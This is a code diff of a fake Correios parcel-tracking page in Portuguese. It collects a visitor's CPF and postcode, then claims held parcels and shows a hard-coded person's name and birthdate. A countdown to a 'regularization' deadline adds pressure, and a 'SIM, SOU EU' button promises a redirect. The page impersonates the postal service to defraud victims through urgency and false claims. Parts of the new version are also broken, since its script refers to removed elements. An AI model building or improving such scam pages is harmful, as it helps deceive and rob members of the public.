@@ -9,28 +9,19 @@
   <link rel="stylesheet" href="css/app.css" />
   <link rel="stylesheet" href="css/yellow.css" />
   <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
-  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
+  <script src="../scripts/utms/latest.js" async defer></script>
   <title>Correios | Rastreio</title>
 
   <style>
+    /* Animação Botão */
     @keyframes pulsar {
-      0% {
-        transform: scale(1);
-      }
-
-      50% {
-        transform: scale(1.1);
-      }
-
-      100% {
-        transform: scale(1);
-      }
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
     }
+    #consultar-btn { animation: pulsar 1s infinite; }
 
-    #consultar-btn {
-      animation: pulsar 1s infinite;
-    }
-
+    /* Spinner */
     .spinner {
       width: 50px;
       height: 50px;
@@ -40,83 +31,34 @@
       animation: spin 1s linear infinite;
       margin: 20px auto;
     }
-
     @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-
-    main {
-      max-width: 1000px;
-      margin: 2rem auto;
-      padding: 0 1rem;
-    }
-
-    #resultado {
-      background: #f8f9fa;
-      border-radius: 10px;
-      padding: 2rem;
-      font-family: Arial, sans-serif;
-      color: #003157;
-      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
-    }
-
-    #resultado h2 {
-      font-weight: 700;
-      margin-bottom: 1rem;
-      color: #003157;
-    }
-
-    #resultado p {
-      font-size: 1.1rem;
-      margin: 0.5rem 0;
-    }
-
-    #resultado p span {
-      font-weight: 700;
-      color: #007bff;
+      to { transform: rotate(360deg); }
     }
 
     #res-prazo {
       color: red;
+      text-align: center;
       font-weight: bold;
-      display: inline-block;
+      display: block;
+      margin: 15px 0;
+      font-size: 1.2rem;
     }
-
-    .btn-primary {
-      background-color: #007bff;
-      border-color: #007bff;
-      padding: 10px 20px;
-      font-size: 16px;
+    #confirmar-btn {
+      display: block;
+      margin: 20px auto;
     }
   </style>
 </head>
 
 <body>
+
+  <!-- [Header e Main mantém igual o seu] -->
+
   <main>
-    <section id="tela-formulario">
-      <h1>Consulta de Encomendas - Correios</h1>
-      <form id="form-rastreamento">
-        <div>
-          <label for="cpf">CPF:</label>
-          <input type="text" id="cpf" placeholder="Digite seu CPF" required />
-        </div>
-        <div>
-          <label for="cep">CEP:</label>
-          <input type="text" id="cep" placeholder="Digite seu CEP" required />
-        </div>
-        <div id="botao-container">
-          <button type="submit" id="consultar-btn">Consultar</button>
-        </div>
-      </form>
-    </section>
+    <!-- Tela Formulário -->
+    <!-- (mantém igual o seu formulário original) -->
 
-    <div id="loading-container" style="display:none;">
-      <div class="spinner"></div>
-      <p>Consultando informações...</p>
-    </div>
-
+    <!-- Tela Resultado -->
     <section id="resultado" style="display: none;">
       <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
       <p><span>Nome:</span> <span id="res-nome"></span></p>
@@ -127,14 +69,18 @@
       <p><span>Bairro:</span> <span id="res-bairro"></span></p>
       <p><span>Cidade:</span> <span id="res-cidade"></span></p>
       <p><span>Estado:</span> <span id="res-estado"></span></p>
-      <p style="text-align:center;">
-        <span>Prazo para Regularização:</span> <span id="res-prazo"></span>
-      </p>
-      <div style="text-align: center; margin-top: 20px;">
-        <button class="btn btn-primary">SIM, SOU EU</button>
+      <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
+      <button id="confirmar-btn" class="btn btn-primary">SIM, SOU EU</button>
+    </section>
+
+    <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
+      <div>
+        <img src="images/banner-1.jpg" alt="" class="w-100" />
       </div>
     </section>
   </main>
+
+  <!-- Footer igual o seu -->
 
   <script>
     function formatarCPF(cpf) {
@@ -145,45 +91,46 @@
       return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
     }
 
-    function startContagemRegressiva(dataFinal) {
-      const prazoSpan = document.getElementById("res-prazo");
+    function calcularPrazoData(dias, horas, minutos) {
+      const prazo = new Date();
+      prazo.setDate(prazo.getDate() + dias);
+      prazo.setHours(horas);
+      prazo.setMinutes(minutos);
+      prazo.setSeconds(0);
+      return prazo;
+    }
 
-      function atualizar() {
+    function atualizarContagemRegressiva(dataLimite) {
+      const intervalo = setInterval(() => {
         const agora = new Date();
-        const distancia = dataFinal - agora;
+        const diff = dataLimite - agora;
 
-        if (distancia <= 0) {
-          prazoSpan.textContent = "Prazo encerrado!";
-          clearInterval(timer);
+        if (diff <= 0) {
+          document.getElementById("res-prazo").textContent = "Prazo expirado!";
+          clearInterval(intervalo);
           return;
         }
 
-        const dias = Math.floor(distancia / (1000 * 60 * 60 * 24));
-        const horas = Math.floor((distancia % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-        const minutos = Math.floor((distancia % (1000 * 60 * 60)) / (1000 * 60));
-        const segundos = Math.floor((distancia % (1000 * 60)) / 1000);
+        const dias = Math.floor(diff / (1000 * 60 * 60 * 24));
+        const horas = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const minutos = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        const segundos = Math.floor((diff % (1000 * 60)) / 1000);
 
-        prazoSpan.textContent = `${dias}d ${horas}h ${minutos}m ${segundos}s`;
-      }
-
-      atualizar();
-      const timer = setInterval(atualizar, 1000);
+        document.getElementById("res-prazo").textContent =
+          `${dias}d ${horas}h ${minutos}m ${segundos}s restantes`;
+      }, 1000);
     }
 
     document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
       event.preventDefault();
 
-      const cpfInput = document.getElementById("cpf");
-      const cepInput = document.getElementById("cep");
-
-      const cpfRaw = cpfInput.value.replace(/\D/g, "");
-      const cepRaw = cepInput.value.replace(/\D/g, "");
+      const cpfRaw = document.getElementById("cpf").value.replace(/\D/g, "");
+      const cepRaw = document.getElementById("cep").value.replace(/\D/g, "");
 
       if (!cpfRaw || cpfRaw.length !== 11) {
         alert("Por favor, insira um CPF válido.");
         return;
       }
-
       if (!cepRaw || cepRaw.length !== 8) {
         alert("Por favor, insira um CEP válido.");
         return;
@@ -194,40 +141,28 @@
 
       await new Promise((resolve) => setTimeout(resolve, 2000));
 
-      const prazoFinal = new Date();
-      prazoFinal.setDate(prazoFinal.getDate() + 10);
-      prazoFinal.setHours(23);
-      prazoFinal.setMinutes(59);
-      prazoFinal.setSeconds(0);
+      const dataLimite = calcularPrazoData(10, 23, 59);
 
-      const dadosPessoa = {
-        nome: "Rosiane Oliveira Da Silva",
-        cpf: formatarCPF(cpfRaw),
-        nascimento: "27/01/1985",
-        cep: formatarCEP(cepRaw),
-        rua: "",
-        bairro: "",
-        cidade: "Porciúncula",
-        estado: "RJ"
-      };
+      document.getElementById("res-nome").textContent = "Rosiane Oliveira Da Silva";
+      document.getElementById("res-cpf").textContent = formatarCPF(cpfRaw);
+      document.getElementById("res-nascimento").textContent = "27/01/1985";
+      document.getElementById("res-cep").textContent = formatarCEP(cepRaw);
+      document.getElementById("res-rua").textContent = "";
+      document.getElementById("res-bairro").textContent = "";
+      document.getElementById("res-cidade").textContent = "Porciúncula";
+      document.getElementById("res-estado").textContent = "RJ";
 
-      document.getElementById("res-nome").textContent = dadosPessoa.nome;
-      document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
-      document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
-      document.getElementById("res-cep").textContent = dadosPessoa.cep;
-      document.getElementById("res-rua").textContent = dadosPessoa.rua;
-      document.getElementById("res-bairro").textContent = dadosPessoa.bairro;
-      document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
-      document.getElementById("res-estado").textContent = dadosPessoa.estado;
+      atualizarContagemRegressiva(dataLimite);
 
       document.getElementById("loading-container").style.display = "none";
       document.getElementById("tela-formulario").style.display = "none";
       document.getElementById("resultado").style.display = "block";
+    });
 
-      startContagemRegressiva(prazoFinal);
+    document.getElementById("confirmar-btn").addEventListener("click", function () {
+      alert("Confirmação recebida! Em breve você será redirecionado.");
     });
   </script>
 </body>
 
 </html>
-
